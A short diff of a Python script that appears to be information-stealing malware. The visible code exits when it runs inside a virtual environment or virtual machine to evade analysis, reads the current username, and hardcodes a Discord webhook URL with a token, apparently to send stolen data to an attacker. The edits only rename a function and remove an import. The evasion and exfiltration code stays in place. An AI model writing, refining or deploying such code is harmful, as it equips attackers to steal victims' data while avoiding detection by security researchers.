@@ -1,9 +1,9 @@
 import sys
 def get_base_prefix_compat():
     return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
-def in_virtualenv(): 
+def invenv(): 
     return get_base_prefix_compat() != sys.prefix
-if in_virtualenv() == True: sys.exit()
+if invenv() == True: sys.exit()
 import ctypes,os
 class AntiVM:
     def __init__(self):
@@ -59,7 +59,7 @@ class AntiVM:
             os._exit(1)
         except:pass
 c = AntiVM
-import re, subprocess , requests
+import re, subprocess
 import getpass;user=getpass.getuser()
 from discord import SyncWebhook
 hook = "https://discord.com/api/webhooks/1306568771644690542/jSSKvJ8P9PyM9Vgv2qv4n5SqN5kFabj3pC1MHdfu6jLaOddhdr4QX-zotnPNZMxo5AeM"
